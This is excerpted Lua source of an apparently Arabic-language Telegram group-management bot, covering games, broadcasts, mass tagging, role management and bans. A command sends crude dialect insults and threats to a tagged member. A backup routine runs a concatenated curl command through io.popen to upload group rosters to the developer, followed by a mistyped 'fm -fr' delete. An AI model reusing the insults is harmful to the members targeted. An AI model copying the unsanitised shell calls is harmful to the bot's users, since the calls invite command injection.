Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevRio:setex(SAKO.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source SAKO     --
...
if not DevRio:get(SAKO..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(SAKO.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(SAKO..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(SAKO.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(SAKO.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevRio:set(SAKO.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevRio:del(SAKO.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(SAKO.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(SAKO..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevRio:sadd(SAKO..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(SAKO.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(SAKO..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(SAKO.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(SAKO.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevRio0 = (DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevRio:del(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source SAKO     --
...
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(SAKO..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevRio:get(SAKO.."Rio:Left:Bot"..SAKO) then
...
local msguser = tonumber(DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(SAKO..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevRio:setex(SAKO..'DevRio4'..msg.sender_user_id_,360,true)
...
function SAKOTeam(extra,result,success)
if DevRio:get(SAKO.."Rio:Send:Bot"..SAKO) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevRio:smembers(SAKO.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(SAKO.."Rio:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n᥀︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),SAKOTeam)
end
end
--     Source SAKO     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevRio:set(SAKO..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
᥀︙[SAKO Team](https://t.me/L9L9L)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/L9L9L"}},
{{text = '᥀ Developer',url="t.me/tsttt"},{text = '᥀ Tws SAKO',url="https://t.me/W555Bot"}},{{text= '᥀ Support Source .',url="https://t.me/joinchat/L980Ig8wQnAyN2Vi"}}
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X6UX6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
if DevRio:get(SAKO.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(SAKO..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(SAKO..'no'..msg.sender_user_id_, 'delno')
...
DevRio:set(SAKO.."Rio:Kick:Me"..msg.chat_id_, true)
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevRio:del(SAKO.."Rio:Kick:Me"..msg.chat_id_)
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
end
--     Source SAKO     --
if text == "نزلني" and ChCheck(msg) then
if DevRio:get(SAKO.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(SAKO..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(SAKO..'nodel'..msg.sender_user_id_, 'delno')
...
DevRio:set(SAKO.."Rio:Del:Me"..msg.chat_id_, true)
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(SAKO.."Rio:Del:Me"..msg.chat_id_)
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
end
--     Source SAKO     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevRio:get(SAKO..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(SAKO..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(SAKO..'Save:UserName'..v.user_id_).."]\n"
else
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevRio:get(SAKO.."Rio:Lock:TagAll")) then
if DevRio:get(SAKO.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(SAKO..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevRio:get(SAKO.."Rio:Lock:TagAdmins")) then
if DevRio:get(SAKO.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(SAKO..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source SAKO     --
if (text and not DevRio:get(SAKO.."Rio:Lock:AutoFile")) then
Time = DevRio:get(SAKO.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevRio:get(SAKO..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevRio:smembers(SAKO..'Rio:RioConstructor:'..v)
BasicConstructors = DevRio:smembers(SAKO..'Rio:BasicConstructor:'..v)
Constructors = DevRio:smembers(SAKO..'Rio:Constructor:'..v)
Managers = DevRio:smembers(SAKO..'Rio:Managers:'..v)
Admis = DevRio:smembers(SAKO..'Rio:Admins:'..v)
Vips = DevRio:smembers(SAKO..'Rio:VipMem:'..v)
if k == 1 then
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..DevId..'" -F "document=@'..SAKO..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..SAKO..'.json')
DevRio:set(SAKO.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevRio:set(SAKO.."Rio:AutoFile:Time",os.date("%x"))
end
...
local EntryNumber = (DevRio:get(SAKO..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(SAKO..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(SAKO..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(SAKO.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(SAKO.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(SAKO..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
get_msg = DevRio:get(SAKO.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source SAKO     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevRio:get(SAKO..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevRio:get(SAKO..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevRio:del(SAKO..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevRio:del(SAKO..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source SAKO     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevRio:get(SAKO..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function SAKOTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(SAKO) then  
...
if DevRio:sismember(SAKO.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local SAKOTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md') 
local SAKOTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..SAKOTeam[math.random(#SAKOTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,SAKOTeam)
end
end
--     Source SAKO     --
...
if tonumber(result.sender_user_id_) == tonumber(SAKO) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if DevRio:sismember(SAKO.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local SAKOTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md') 
local SAKOTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..SAKOTeam[math.random(#SAKOTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local SAKOTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md') 
local SAKOTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..SAKOTeam[math.random(#SAKOTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local SAKOTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md') 
local SAKOTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..SAKOTeam[math.random(#SAKOTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local SAKOTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md') 
local SAKOTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..SAKOTeam[math.random(#SAKOTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
...
if DevRio:sismember(SAKO..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevRio:sismember(SAKO..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(SAKO..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(SAKO..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(SAKO..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(SAKO..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(SAKO..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(SAKO..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(SAKO..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevRio:srem(SAKO..'Rio:RioSudo:', result.sender_user_id_)
DevRio:srem(SAKO..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(SAKO..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(SAKO..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(SAKO..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(SAKO..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(SAKO..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(SAKO..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevRio:sismember(SAKO..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(SAKO..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(SAKO..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(SAKO..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(SAKO..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(SAKO..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(SAKO..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(SAKO..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(SAKO..'Rio:RioSudo:', result.id_)
DevRio:srem(SAKO..'Rio:SecondSudo:', result.id_)
DevRio:srem(SAKO..'Rio:SudoBot:', result.id_)
DevRio:srem(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(SAKO..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(SAKO..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(SAKO..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(SAKO..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(SAKO..'Rio:SecondSudo:', result.id_)
DevRio:srem(SAKO..'Rio:SudoBot:', result.id_)
DevRio:srem(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(SAKO..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(SAKO..'Rio:RioSudo:',result.id_)
...
DevRio:sadd(SAKO..'Rio:RioSudo:',user)
...
DevRio:srem(SAKO..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(SAKO..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(SAKO..'Rio:SecondSudo:',result.id_)
...
DevRio:sadd(SAKO..'Rio:SecondSudo:',user)
...
DevRio:srem(SAKO..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(SAKO..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(SAKO..'Rio:SudoBot:',result.id_)
...
DevRio:sadd(SAKO..'Rio:SudoBot:',user)
...
DevRio:srem(SAKO..'Rio:SudoBot:',user)
...
DevRio:sadd(SAKO..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(SAKO..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(SAKO..'Rio:Owner:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
DevRio:srem(SAKO..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:srem(SAKO..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(SAKO.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:sadd(SAKO..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(SAKO..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(SAKO..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:sadd(SAKO..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:sadd(SAKO..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(SAKO..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(SAKO..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:sadd(SAKO..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:sadd(SAKO..'Rio:VipMem:'..msg.chat_id_,user)
...
DevRio:srem(SAKO..'Rio:VipMem:'..msg.chat_id_,user)
...
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..SAKO)
local GetInfo = JSON.decode(Check)
...
SAKOTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,SAKOTeam[math.random(#SAKOTeam)])
end
--     Source SAKO     --
...
DevRio:del(SAKO.."Rio:Lock:KickBan"..msg.chat_id_)
...
DevRio:set(SAKO.."Rio:Lock:KickBan"..msg.chat_id_,"true")
...
DevRio:del(SAKO.."Rio:Lock:MuteTked"..msg.chat_id_)
...
DevRio:set(SAKO.."Rio:Lock:MuteTked"..msg.chat_id_,"true")
...
DevRio:del(SAKO.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevRio:set(SAKO.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source SAKO     --
...
if not RioConstructor(msg) and DevRio:get(SAKO.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(SAKO..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevRio:get(SAKO.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(SAKO..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevRio:sadd(SAKO..'Rio:Ban:'..msg.chat_id_, user)
...
DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_, user)
...
